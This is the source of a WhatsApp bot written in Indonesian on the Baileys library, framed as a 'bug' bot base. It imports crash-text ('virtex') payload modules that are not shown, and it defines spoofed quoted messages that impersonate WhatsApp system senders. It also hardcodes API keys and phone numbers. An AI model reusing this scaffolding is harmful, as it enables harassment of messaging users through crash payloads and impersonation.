/*.HANZ々OFC彡
BASE HANZBUG V4
Wong々Hore Team
Yang Rename Yatem
cd /sdcard && cd BUGV2 && pm2 start main.js && pm2 save && pm2 monit
*/



const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const simple = require('./lib/simple.js')
const phoneNum = require("awesome-phonenumber");
//~~~~~~~~~~~~~~~~~~~~~[VIRTEX GANAS]~~~~~~~~~~~~~~~~~~~~~//
const { api } = require('./media/api')
const { hanz } = require('./media/hanz')
const { trava } = require('./media/trava')
const { virtex } = require('./media/virtex')
const { virtex2 } = require('./media/virtex2')
const { virtex3 } = require('./media/virtex3')
const { virtex4 } = require('./media/virtex4')
const { virtex5 } = require('./media/virtex5')
const { virtex6 } = require('./media/virtex6')
const { virtex7 } = require('./media/virtex7')
const { virtex8 } = require('./media/virtex8')
const { virtex9 } = require('./media/virtex9')
const { ngazap } = require('./media/ngazap')
const { virtag } = require('./media/virtag')
const { penawarbug } = require('./media/penawarbug')
//~~~~~~~~~~~~~~~~~~~~~[BATES COK]~~~~~~~~~~~~~~~~~~~~~//
const { removeBackgroundFromImageFile } = require('remove.bg')
const { fetchJosn, kyun, fetchText } = require('./lib/fetcher')
const { color, bgcolor } = require('./lib/color')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
//~~~~~~~~~~~~~~~~~~~~~[DATABASE]~~~~~~~~~~~~~~~~~~~~~//
const _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const setting = JSON.parse(fs.readFileSync('./media/setting.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
///~~~~~~~~~~~~~~~~~~~~~[STICKER CMD]~~~~~~~~~~~~~~~~~~~~~//
const addCmd = (id, command) => {
const obj = { id: id, chats: command }
scommand.push(obj)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}
const getCommandPosition = (id) => {
let position = null
Object.keys(scommand).forEach((i) => {
if (scommand[i].id === id) {
position = i
}
})
if (position !== null) {
return position
}
}
const getCmd = (id) => {
let position = null
Object.keys(scommand).forEach((i) => {
if (scommand[i].id === id) {
position = i
}
})
if (position !== null) {
return scommand[position].chats
}
}
const checkSCommand = (id) => {
let status = false
Object.keys(scommand).forEach((i) => {
if (scommand[i].id === id) {
status = true
}
})
return status
}
//~~~~~~~~~~~~~~~~~~~~~[SETTING]~~~~~~~~~~~~~~~~~~~~~//
owner = setting.OwnerNumber
botname = setting.BotName
Han = setting.HanzKey
Hankey = setting.hanzKey
ownername = setting.OwnerName
creator = 'ʜᴀɴᴢ々ᴏꜰᴄ' // GAK USAH DI UBAH
recode = 'ʜᴀɴᴢ々ᴏꜰᴄ' // UBAH NAMA LU

//~~~~~~~~~~~~~~~~~~~~~[BY HANZ々OFC彡]~~~~~~~~~~~~~~~~~~~~~//
baterai = {
battery: "" || "Tidak Terdeteksi",
isCharge: "" || false
}
publik = true
readG = true 
readP = true
let autovn = false
let ngetik = false
Nogopay = 083144394823
Nodana = 083144394823
Noovo = 083144394823
fakeimage = fs.readFileSync("./media/thumnail.jpg")
virgam = fs.readFileSync(`./media/virgam.jpeg`)
asutes = 'Wong々Hore Team[🔥]'
fake = 'ʜᴀɴᴢ々ᴏꜰᴄ️'
xteam = 'edd4e2b682326371'
lolkey = '682aeab645ed61cf137cf971'
HunterApi = 'Ikyy69'
lolhuman = 'lolhuman'
//~~~~~~~~~~~~~~~~~~~~~[MODUL EXPROTS]~~~~~~~~~~~~~~~~~~~~~//

module.exports = Hanz = async (Hanz, mek, _welkom) => {
try {
if (!mek.hasNewMessage) return
mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
		m = simple.smsg(Hanz, mek)
		let { mentioned } = m
		bail = m.isBaileys
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
        Hanz.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
        const prefix =  /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	      
		body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''		
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)		
		const arg = budy.slice(command.length + 2, budy.length)	
		const q = args.join(' ')		
		const Verived = "0@s.whatsapp.net"
		const txt = mek.message.conversation
		const botNumber = Hanz.user.jid
		const ownerNumber = [`${owner}@s.whatsapp.net`, `6283144394823@s.whatsapp.net`]
		const dtod = "6285706035039@s.whatsapp.net"
        const otod = "6285706035039@s.whatsapp.net"
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		const totalchat = await Hanz.chats.all()
		const groupMetadata = isGroup ? await Hanz.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const conts = mek.key.fromMe ? Hanz.user.jid : Hanz.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Hanz.user.name : conts.notify || conts.vname || conts.name || '-'
          
//~~~~~~~~~~~~~~~~~~~~~[GROUP]~~~~~~~~~~~~~~~~~~~~~//        
		const isAntiLink = isGroup ? _antilink.includes(from) : false
		const isWelkom = isGroup ? _welkom.includes(from) : false
		const isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
		const isOwner = ownerNumber.includes(sender)
		const isMybot = isOwner || mek.key.fromMe
		
//~~~~~~~~~~~~~~~~~~~~~[CONEECTION 1]~~~~~~~~~~~~~~~~~~~~~//
mess = {
wait: '*☐* Silahkan tunggu',
success: '*☉* Berhasil',
error: {
stick: '*☒* Silakan ulangi beberapa saat lagi',
Iv: '*☒* Link Error'
},
only: {
admin: '*☒* Fitur ini hanya untuk *ADMIN GRUP*',
group: '*☒* Fitur ini hanya untuk *GRUP*'
}
}
//FAKE TEXT BUTTON
faketeks = 'ʜᴀɴᴢ々ᴏꜰᴄ'
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
}
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms));
}
const reply = (teks) => {
Hanz.sendMessage(from, teks, text, {quoted:mek})
}
const sendMess = (hehe, teks) => {
Hanz.sendMessage(hehe, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? Hanz.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Hanz.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
}
const zero = fs.readFileSync ('./media/thumnail.jpg')
const costum = (pesan, tipe, target, target2) => {
Hanz.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
}
const runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
};

var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                         //WAKTU UCAPAN                      
case 0: jamss = "Jangan gadang kak"; break;
  case 1: jamss = "Jangan gadang kak"; break;
     case 2: jamss = "Jangan gadang kak"; break;
        case 3: jamss = "Jangan gadang kak"; break;
            case 4: jamss = "Sholat subuh kak"; break;
               case 5: jamss = "Selamat pagi"; break;
                 case 6: jamss = "Selamat pagi"; break;
                    case 7: jamss = "Selamat pagi"; break;
                       case 8: jamss = "Selamat pagi"; break;
                          case 9: jamss = "Selamat pagi"; break;
                             case 10: jamss = "Selamat pagi"; break;
                               case 11: jamss = "Selamat siang"; break;
                                 case 12: jamss = "sholat Zuhur kak"; break;//GABUT🗿
                              case 13: jamss = "Selamat siang"; break;
                           case 14: jamss = "Selamat sore"; break;
                        case 15: jamss = "sholat Ashar kak"; break;
                     case 16: jamss = "Selamat sore"; break;
                  case 17: jamss = "Selamat sore"; break;
               case 18: jamss = "Selamat malam"; break;
            case 19: jamss = "sholat Isya kak"; break;
         case 20: jamss = "Selamat malam"; break;
      case 21: jamss = "Selamat malam"; break;
   case 22: jamss = "Selamat malam"; break;
case 23: jamss = "Selamat malam"; break;
}
//WAKTU/JAM
var tampilUcapan = "" + jamss;
const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍇 : 🍇','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
const sotoy2 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
const sotoy1 = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔',		'🍐 : 🍒 : 🍋','🍊 : 🍒 : 🍒','?? : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇']
const sotoy3 = ['🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌']
const buruh1 = ['🐳','🦈','🐬','🐋','🐟','🐠','🦐','🦑','🦀','🐚']
const buruh2 = ['🐔','🦃','🐿','🐐','🐏','🐖','🐑','🐎','🐺','🦩']
const buruh3 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
const buruh11 = buruh1[Math.floor(Math.random() * (buruh1.length))]
const buruh22 = buruh2[Math.floor(Math.random() * (buruh2.length))]
const buruh33 = buruh3[Math.floor(Math.random() * (buruh3.length))]
const sticOk = (hehe) => {
ano = fs.readFileSync('./media/ok.webp')
Hanz.sendMessage(hehe, ano, sticker, { quoted: ftrol})
}
// Auto Read Group
var chats = await Hanz.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await Hanz.chatRead(jid)
})
// Auto Read Private ( HW MODS WA )
var chatss = await Hanz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readP === false) return
await Hanz.chatRead(jid)
})
//~~~~~~~~~~~~~~~~~~~~~[BUTTON CMD]~~~~~~~~~~~~~~~~~~~~~//
//FAKE REPLY         
const replyy = (teks) => {
Hanz.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `HANZ々OFC彡[BOTZ🎭]`,
"body": "",
"previewType": "PHOTO",
"thumbnailUrl": "https://i.postimg.cc/KcpQgw1r/20211220-190946.jpg",
"thumbnail": fake,
"sourceUrl": ``
},mentionedJid:[sender]}, quoted : mek})
};
//BUTTON LOKASI              
const sendButtonLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Hanz.prepareMessage(from, kma, location,{ waitForAck: true })
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Hanz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON TEXT
const sendButton = async (from, context, fortext, but, mek) => {
buttonMessages = {
contentText: context,
footerText: fortext,
buttons: but,
headerType: 1
}
Hanz.sendMessage(from, buttonMessages, buttonsMessage, {
quoted: ftrol
})
}         
//BUTTON DOCUMENT
const Sendbutdocument = async(id, text1, desc1, file1, doc1, but = [], options = {}) => {
media = file1
kma = doc1
mhan = await Hanz.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
Hanz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON FOTO
const sendButImage = async (from, context, fortext, img, but, mek) => {
jadinya = await Hanz.prepareMessage(from, img, image)
buttonMessagesI = {
imageMessage: jadinya.message.imageMessage,
contentText: context,
footerText: fortext,
buttons: but,
headerType: 4
}
Hanz.sendMessage(from, buttonMessagesI, buttonsMessage, {
quoted: ftrol,
contexInfo: adyt
})
}        
const adyt = { 
"title": `Hallo ${pushname}`,
"body": `hy`, 
"mediaType": "2", 
"mediaUrl": "https://youtu.be/ilrhJV_QMIE", 
"thumbnail": fs.readFileSync('./media/thumnail.jpg')
}
const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
}
//BUTTON DAFTAR/VERIFY
const isRegistered = checkRegisteredUser(sender)

const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
Hanz.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};

const daftar1 = `Hai kak  ${pushname} ${tampilUcapan} \n\nSebeum Menggunakan Bot ${botname} Harap Daftarkan Diri dengan klik Button Verify di bawah ini!`
const daftar2 = 'SUBSCRIBE LINK DI BAWAH INI❕\nhttps://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw'
const daftar3 = [{buttonId: `${prefix}verify`,buttonText: {displayText: `VERIFY㋡`,},type: 1,},]

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

//~~~~~~~~~~~~~~~~~~~~~[ WADERFAK MEN ]~~~~~~~~~~~~~~~~~~~~~//
//FAKE STATUS
const fakestatus = (teks) => {
Hanz.sendMessage(from, teks, text, {
quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
"mimetype": "image/jpeg",
"caption": faketeks,
"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
"fileLength": "28777",
"height": 1080,
"width": 1079,
"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
"mediaKeyTimestamp": "1610993486",
"jpegThumbnail": fs.readFileSync('./media/thumnail.jpg'),
"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
}
}
}
})
}       
//FAKE TROLI       
const ftrol = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 2022,
status: 1,
surface : 1,
message: `ʜᴀɴᴢ々ᴏꜰᴄ`, 
orderTitle: `ʜᴀɴᴢ々ᴏꜰᴄ`,
thumbnail: Hanz, //Gambarnye
sellerJid: '0@s.whatsapp.net' 
}
}
}
//FAKE LOKASi                   
const floc = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
liveLocationMessage: {
caption: `${tampilUcapan} ${pushname}`,
jpegThumbnail: Hanz
}
}
}
//FAKE DOKUMEN                     
const fdoc = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
documentMessage: {
title: `${tampilUcapan} ${pushname}`, 
jpegThumbnail: Hanz
}
}
}           
//~~~~~~~~~~~~~~~~~~~~~[CONEECTION 2]~~~~~~~~~~~~~~~~~~~~~//

        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Hanz.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Hanz.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
//ANTI LINK COK          
if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup :(`)
setTimeout(() => {
Hanz.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}
//ANTI VIRTEX COK
if (budy.length > 3500) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
reply('Tandai telah dibaca\n'.repeat(300))
reply(`「 *VIRTEX DETECTOR* 」\n\nKamu mengirimkan virtex, maaf kamu di kick dari group :(`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Hanz.groupRemove(from, [sender])
}     
                      

//~~~~~~~~~~~~~~~~~~~~~[CONEECTION 3]~~~~~~~~~~~~~~~~~~~~~//

		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		//Self/Public
		if (!publik) {
		if (!isOwner && !mek.key.fromMe) return
		}
		//Auto Vn
		if (autovn){
		await Hanz.updatePresence(from, Presence.recording)
		} else if (ngetik){//Auto Ketik
		await Hanz.updatePresence(from, Presence.composing)
		} else {
		await Hanz.updatePresence(from, Presence.avaible)
		}
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mCMD PRIVATE\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mCMD GROUP\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))

//~~~~~~~~~~~~~~~~~~~~~[MENU🤓]~~~~~~~~~~~~~~~~~~~~~//
switch (command) {        
//SEBENARNYA BUTTON LOKASI SIH TAPI KEK NYA JELEK
//KALO BUTTON IMAGE DELAY JUGA YA BINGGUNG ASW
case 'menu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
teks =
`
                █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
                █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
                █░░║║║╠─║─║─║║║║║╠─░░█
                █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
                █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█

❏INFO BOT❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
╔═════════════════⎉
║冬Nama Bot : ${botname}
║冬Nama Owner : ${ownername}
║冬Nomor Owner : ${owner}
║冬Creator : ${creator}
║冬Mode : ${publik ? 'Public' : 'Self'}
║冬Runtime : ${runtime(process.uptime())}
║冬Prefix : Multi
║冬Battery : ${baterai.battery}
║冬Charged : ${baterai.isCharge ? 'Cas' : 'Tidak'}
║冬Autoread pc : ${readP ? 'On' : 'Off'}
║冬Autoread gc : ${readG ? 'On' : 'Off'}
║冬Auto Ketik : ${ngetik ? 'On' : 'Off'}
║冬Auto Recording : ${autovn ? 'On' : 'Off'}
╚═════════════════❍ 
❏INFO USER❏
┏━━⊱ 
┣🔰Nama User : ${pushname}
┣🔰Nomer User : ${sender.split("@")[0]}
┗━━⊱
❏TO DAY❏
┏━━⊱ 
┣🗣${tampilUcapan}
┣🕑Jam : ${time}
┗━━⊱
`
gam = fs.readFileSync('./media/thumnail.jpg')
but = [
{buttonId: `${prefix}command`, buttonText: { displayText: '⎙ MENU' }, type: 1 },
{buttonId: `${prefix}allmenu`, buttonText: { displayText: '⎙ ALL MENU' }, type: 1 },
{buttonId: `${prefix}menucatalog`, buttonText: { displayText: '⎙ CATALOG MENU' }, type: 1 },
]
sendButImage(from, teks, "©HANZ々OFC彡", gam, but)        
break 
case 'kontol': 
let cok = Hanz.sendMessage(await m.getQuotedObj())
await cok.quoted.copyNForward(m.chat, true)
break
case 'allmenu':
        ptod = "6285706035039@s.whatsapp.net"
        stod = `Hai👋 Saya ${botname}`
        uwu = '```'
       stst = await Hanz.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
       menu = `Hai👋 Im ${botname}:)
┌─❑「 INFO DEVELOPER 」
│👤 Nama : Haris
│📃 Github : Cari Sendiri!?
│▶ Yutub : HANZ々OFC彡
│💮 Ig : @wong_koclok 
└─❑
┌─❑「 INFO BOTZ 」
│冬Nama Bot : ${botname}
║冬Nama Owner : ${ownername}
│冬Nomor Owner : ${owner}
║冬Creator : ${creator}
│冬Mode : ${publik ? 'Public' : 'Self'}
║冬Runtime : ${runtime(process.uptime())}
│冬Prefix : Multi
║冬Battery : ${baterai.battery}
│冬Charged : ${baterai.isCharge ? 'Cas' : 'Tidak'}
║冬Autoread pc : ${readP ? 'On' : 'Off'}
│冬Autoread gc : ${readG ? 'On' : 'Off'}
║冬Auto Ketik : ${ngetik ? 'On' : 'Off'}
│冬Auto Recording : ${autovn ? 'On' : 'Off'}
└─────❑
┌─❑
│「 FULL MENU KEBAWAH 」
└┬❑
    │ 「 Self And Public」
┌┤冬  >public
││冬  >self 
│└────────────┈ ⳹
│ 「 GROUP MENU」
│冬 ${prefix}welcome on/off
│冬 ${prefix}antilink
│冬 ${prefix}antivirtex
│冬 ${prefix}add
│冬 ${prefix}kick
│冬 ${prefix}promote
│冬 ${prefix}demote
│冬 ${prefix}tagall
│冬 ${prefix}hidetag
│冬 ${prefix}setpp
│冬 ${prefix}setdes
│冬 ${prefix}setname
│─────────────┈ ⳹
│ 「 OWNER MENU」
│冬 ${prefix}set
│冬 ${prefix}auto
│冬 ${prefix}bc
│冬 ${prefix}bc2
│冬 ${prefix}tobc
│冬 ${prefix}jadibot
│冬 ${prefix}stopjadibot
│冬 ${prefix}addcmd
│冬 ${prefix}delcmd
│冬 ${prefix}listcmd
│冬 ${prefix}restart
│冬 ${prefix}autorespon pc/gc
│冬 ${prefix}setppbot
│冬 ${prefix}setppwa
│冬 ${prefix}upswtext
│冬 ${prefix}upswvn
│冬 ${prefix}upswvideo
│冬 ${prefix}upswimage
│冬 ${prefix}upswgif
│冬 ${prefix}upswaudio
│冬 ${prefix}upswsticker
│冬 ${prefix}upswlokasi
│─────────────┈ ⳹
│ 「 MAKER MENU 」
│冬 ${prefix}neon
│冬 ${prefix}quote
│冬 ${prefix}glow
│冬 ${prefix}burn
│冬 ${prefix}flower
│冬 ${prefix}wooden
│冬 ${prefix}golden
│冬 ${prefix}summer
│冬 ${prefix}maker2d2
│冬 ${prefix}maker2d3
│冬 ${prefix}maker2d4
│冬 ${prefix}maker3d2
│冬 ${prefix}maker3d3
│冬 ${prefix}maker3d4
│冬 ${prefix}transformer
│冬 ${prefix}googletxt
│冬 ${prefix}coffeecup
│冬 ${prefix}battlefield
│─────────────┈ ⳹
│ 「 IMAGE MENU」
│冬 ${prefix}attp
│冬 ${prefix}toimg
